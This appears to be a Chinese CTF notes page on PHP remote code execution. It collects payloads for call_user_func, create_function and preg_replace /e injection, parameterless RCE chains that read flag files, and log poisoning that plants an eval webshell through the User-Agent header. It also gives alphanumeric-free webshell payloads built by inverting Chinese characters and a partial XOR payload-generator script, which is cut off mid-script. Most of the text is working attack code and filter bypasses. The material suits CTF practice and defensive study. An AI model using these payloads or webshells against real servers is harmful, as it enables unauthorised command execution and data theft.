<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$parameters</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$action</span>, ...<span class="variable">$parameters</span>);</span><br><span class="line">...<span class="variable">$parameters</span>的值为<span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;whoami&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=system&amp;1=whoami</span><br></pre></td></tr></table></figure>

<p>PHP 在用户自定义函数中支持可变数量的参数列表。由 <code>...</code> 语法实现。</p>
<p>包含 <code>...</code> 的参数，会转换为指定参数变量的一个 array：</p>
<p><strong>unset()</strong> 函数用于销毁给定的变量</p>
<h3 id="拓展2"><a href="#拓展2" class="headerlink" title="拓展2"></a>拓展2</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$parameters</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$action</span>, <span class="variable">$parameters</span>)(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=current&amp;a=current</span><br><span class="line">post:a[]=system&amp;b=whoami</span><br></pre></td></tr></table></figure>

<h3 id="拓展3"><a href="#拓展3" class="headerlink" title="拓展3"></a>拓展3</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class A&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$parameters</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$action</span>, <span class="variable">$parameters</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=A::f</span><br><span class="line">post:a=whoami</span><br></pre></td></tr></table></figure>

<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>ctfshow 147</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">GET ?show=;&#125;;system(&#x27;grep flag flag.php&#x27;);/*</span><br><span class="line">POSOT ctf=%5ccreate_function</span><br></pre></td></tr></table></figure>

<h2 id="pre-replace"><a href="#pre-replace" class="headerlink" title="pre_replace"></a>pre_replace</h2><p><a href="https://www.sqlsec.com/2020/07/preg_replace.html">PHP preg_系列漏洞小结 | 国光 (sqlsec.com)</a></p>
<p>php5.5 之后废除</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>另一个版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo preg_replace($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;],$_GET[&#x27;c&#x27;]);</span><br></pre></td></tr></table></figure>

<p>传入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=/zhou/e&amp;b=system(&#x27;cat /flag&#x27;)&amp;c=zhou</span><br></pre></td></tr></table></figure>



<h2 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h2><p><strong>array_map()</strong> 返回一个 <a href="https://www.php.net/manual/zh/language.types.array.php">array</a>，包含将 <code>array</code> 的相应值作为回调的参数顺序调用 <code>callback</code> 后的结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cube</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$n</span> * <span class="variable">$n</span> * <span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;cube&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">    [1] =&gt; 8</span><br><span class="line">    [2] =&gt; 27</span><br><span class="line">    [3] =&gt; 64</span><br><span class="line">    [4] =&gt; 125</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>命令执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    <span class="variable">$old_array</span>[<span class="number">0</span>] = <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="variable">$new_array</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$old_array</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$new_array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag:/flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shaw&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$shaw</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shaw&#x27;</span>];</span><br><span class="line">    <span class="variable">$root</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z_]*$/isD&#x27;</span>,<span class="variable">$shaw</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/rm|ch|nc|net|ex|\-|de|cat|tac|strings|h|wget|\?|cp|mv|\||so|\$/i&#x27;</span>,<span class="variable">$root</span>))&#123;</span><br><span class="line">            <span class="variable">$shaw</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$root</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Almost there^^&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?root=;&#125;system(&#x27;ca\t /f*&#x27;);/*</span><br><span class="line">shaw=create_function</span><br></pre></td></tr></table></figure>



<p>这里使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(dirname(__FILE__)));查看当前目录下文件</span><br><span class="line">然后找到flag.php</span><br><span class="line">print_r(next(array_reverse(scandir(dirname(__FILE__)))));</span><br><span class="line">之后高亮显示即可</span><br><span class="line">c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</span><br></pre></td></tr></table></figure>

<p>方法二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>方法三</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=show_source(session_id(session_start()));，别忘了修改Cookie: PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>

<p>方法四</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=session_start();system(session_id());</span><br><span class="line">passid=ls</span><br></pre></td></tr></table></figure>

<p>方法五</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv()))))); </span><br></pre></td></tr></table></figure>

<p>方法六</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br><span class="line">或者</span><br><span class="line">readfile(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>方法七</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(var_dump(end(getallheaders())));</span><br></pre></td></tr></table></figure>

<p>方法八</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval(end(current(get_defined_vars())));&amp;a=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a>无参rce</h2><p><strong><code>__FILE__</code></strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo __FILE__ ; // 取得当前文件的绝对地址，结果：D:\www\test.php </span><br><span class="line"></span><br><span class="line">echo dirname(__FILE__); // 取得当前文件所在的绝对目录，结果：D:\www\ </span><br><span class="line"></span><br><span class="line">echo dirname(dirname(__FILE__)); //取得当前文件的上一层目录名，结果：D:\ </span><br></pre></td></tr></table></figure>

<p><strong>scandir</strong></p>
<p>(PHP 5, PHP 7, PHP 8)</p>
<p> 列出指定路径中的文件和目录，返回 array，包含有 <code>directory</code> 中的文件和目录。</p>
<p><strong>array_reverse()</strong> 接受数组 <code>array</code> 作为输入并返回一个单元为相反顺序的新数组。</p>
<p><strong>next</strong>  将数组中的内部指针向前移动一位</p>
<p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$transport = array(&#x27;foot&#x27;, &#x27;bike&#x27;, &#x27;car&#x27;, &#x27;plane&#x27;);</span><br><span class="line">$mode = current($transport); // $mode = &#x27;foot&#x27;;</span><br><span class="line">$mode = next($transport);    // $mode = &#x27;bike&#x27;;</span><br><span class="line">$mode = next($transport);    // $mode = &#x27;car&#x27;;</span><br><span class="line">$mode = prev($transport);    // $mode = &#x27;bike&#x27;;</span><br><span class="line">$mode = end($transport);     // $mode = &#x27;plane&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>session_id()</strong> </p>
<p>返回当前会话ID。 如果当前没有会话，则返回空字符串（<code>&quot;&quot;</code>）。失败时返回 **<code>false</code>**。</p>
<p><strong>localeconv()</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [decimal_point] =&gt; .</span><br><span class="line">    [thousands_sep] =&gt;</span><br><span class="line">    [int_curr_symbol] =&gt; EUR</span><br><span class="line">    [currency_symbol] =&gt; €</span><br><span class="line">    [mon_decimal_point] =&gt; ,</span><br><span class="line">    [mon_thousands_sep] =&gt;</span><br><span class="line">    [positive_sign] =&gt;</span><br><span class="line">    [negative_sign] =&gt; -</span><br><span class="line">    [int_frac_digits] =&gt; <span class="number">2</span></span><br><span class="line">    [frac_digits] =&gt; <span class="number">2</span></span><br><span class="line">    [p_cs_precedes] =&gt; <span class="number">1</span></span><br><span class="line">    [p_sep_by_space] =&gt; <span class="number">1</span></span><br><span class="line">    [n_cs_precedes] =&gt; <span class="number">1</span></span><br><span class="line">    [n_sep_by_space] =&gt; <span class="number">1</span></span><br><span class="line">    [p_sign_posn] =&gt; <span class="number">1</span></span><br><span class="line">    [n_sign_posn] =&gt; <span class="number">2</span></span><br><span class="line">    [grouping] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">        )</span><br><span class="line">    [mon_grouping] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">3</span></span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>也就是返回  .</p>
<p><strong>readfile</strong></p>
<p>读取文件并写入到输出缓冲。</p>
<p><strong>getcwd()取得当前工作目录。</strong></p>
<p>**pos 此函数是该函数的别名：current()**\</p>
<p><strong>array_flip()</strong> 返回一个反转后的 array，例如 <code>array</code> 中的键名变成了值，而 <code>array</code> 中的值成了键名。</p>
<p><strong>getallheaders</strong> ()</p>
<p>获取当前请求的所有请求头信息。</p>
<p>使用getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效</p>
<p><strong>get_defined_vars()</strong></p>
<p>此函数返回多维数组。包含调用 <strong>get_defined_vars()</strong> 作用域内所有已定义的变量、环境变量、服务器变量、用户定义变量列表。</p>
<p><strong>session_id()</strong></p>
<p>可以获取PHPSESSID的值</p>
<h3 id="读取目录："><a href="#读取目录：" class="headerlink" title="读取目录："></a>读取目录：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(&quot;/&quot;));</span><br><span class="line">print_r(glob(&quot;*&quot;)); // 列当前目录</span><br><span class="line">print_r(glob(&quot;/*&quot;)); // 列根目录</span><br><span class="line">print_r(scandir(&quot;.&quot;));</span><br><span class="line">print_r(scandir(&quot;/&quot;));</span><br><span class="line">$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br><span class="line">$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125;</span><br><span class="line">$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot;   &quot;;&#125;</span><br><span class="line">$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</span><br></pre></td></tr></table></figure>

<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file($filename);</span><br><span class="line"></span><br><span class="line">show_source($filename);</span><br><span class="line"></span><br><span class="line">print_r(php_strip_whitespace($filename));</span><br><span class="line"></span><br><span class="line">print_r(file_get_contents($filename));</span><br><span class="line"></span><br><span class="line">readfile($filename);</span><br><span class="line"></span><br><span class="line">print_r(file($filename)); // var_dump</span><br><span class="line"></span><br><span class="line">fread(fopen($filename,&quot;r&quot;), $size);</span><br><span class="line"></span><br><span class="line">include($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">include_once($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">require($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">require_once($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));</span><br><span class="line"></span><br><span class="line">print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行</span><br><span class="line"></span><br><span class="line">fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOF</span><br><span class="line"></span><br><span class="line">print_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));</span><br><span class="line"></span><br><span class="line">print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一行并过滤掉 HTML 标记</span><br><span class="line"></span><br><span class="line">print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));</span><br><span class="line"></span><br><span class="line">print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</span><br></pre></td></tr></table></figure>

<h2 id="括号过滤"><a href="#括号过滤" class="headerlink" title="括号过滤"></a>括号过滤</h2><p>nclude不用括号，分号可以用?&gt;代替,伪协议文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[0]?&gt;&amp;0=data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br><span class="line">c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br></pre></td></tr></table></figure>

<p>方法二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[0]?&gt;&amp;0=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>方法三,日志包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[0]?&gt;&amp;0=/var/log/nginx/access.log</span><br><span class="line">User-Agent: &lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="eval-注释符绕过"><a href="#eval-注释符绕过" class="headerlink" title="eval 注释符绕过"></a>eval 注释符绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a %0d ?&gt; </span><br></pre></td></tr></table></figure>

<p>参考</p>
<p><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">创造tips的秘籍——PHP回调后门 | 离别歌 (leavesongs.com)</a></p>
<h1 id="过滤字符"><a href="#过滤字符" class="headerlink" title="过滤字符"></a>过滤字符</h1><h2 id="中文绕过"><a href="#中文绕过" class="headerlink" title="中文绕过"></a>中文绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_char</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>文件上传</p>
<p>经过测试，发现字母、数字都被过滤了。典型的无字母数字webshell</p>
<p><code>+ | ^ % &gt; &lt; &#39;</code> 等字符被过滤了，所以我们只能使用取反 <code>~</code> 绕过</p>
<p>测试得知，中文不会被绕过，所以我们需要使用中文取反</p>
<p>这里总结一下使用中文取反的汉字：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo ~&quot;区&quot;[1].PHP_EOL;</span><br><span class="line">echo ~&quot;冈&quot;[1].PHP_EOL;</span><br><span class="line">echo ~&quot;勺&quot;[1].PHP_EOL;</span><br><span class="line">echo ~&quot;皮&quot;[1].PHP_EOL;</span><br><span class="line">echo ~&quot;针&quot;[1].PHP_EOL;</span><br><span class="line">// system</span><br><span class="line">echo ~&quot;码&quot;[1].PHP_EOL;</span><br><span class="line">echo ~&quot;寸&quot;[1].PHP_EOL;</span><br><span class="line">echo ~&quot;小&quot;[1].PHP_EOL;</span><br><span class="line">echo ~&quot;欠&quot;[1].PHP_EOL;</span><br><span class="line">echo ~&quot;立&quot;[1].PHP_EOL;</span><br><span class="line">// _POST</span><br><span class="line"></span><br><span class="line">PHP</span><br></pre></td></tr></table></figure>

<p>根据以上这些汉字，我们就可以构造出我们想要的命令执行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[]; //array</span><br><span class="line">$__=$_.$_; //arrayarray</span><br><span class="line">$_=($_==$__);//$_=(array==arrayarray)明显不相同 false 0</span><br><span class="line">$__=($_==$_);//$__=(array==array) 相同返回1</span><br><span class="line"></span><br><span class="line">$____ = ~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__];//system</span><br><span class="line">$___ = ~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__];//_POST</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$____($$__[_]);//也就是system($_POST[_])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="variable">$_</span>=[];<span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>;<span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>);<span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>);<span class="variable">$___</span>=~区[<span class="variable">$__</span>].~冈[<span class="variable">$__</span>].~区[<span class="variable">$__</span>].~勺[<span class="variable">$__</span>].~皮[<span class="variable">$__</span>].~针[<span class="variable">$__</span>];<span class="variable">$____</span>=~码[<span class="variable">$__</span>].~寸[<span class="variable">$__</span>].~小[<span class="variable">$__</span>].~欠[<span class="variable">$__</span>].~立[<span class="variable">$__</span>];<span class="variable">$___</span>(<span class="variable">$$____</span>[_]);</span><br></pre></td></tr></table></figure>

<p>直接蚁剑连接即可</p>
<p>用浏览器hackbar 注意蚁剑好像连接有问题。</p>
<p>flag 在环境里</p>
<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>先使用这个脚本生成可用的字符的字典</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>

<p>然后进行构建payload 的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py 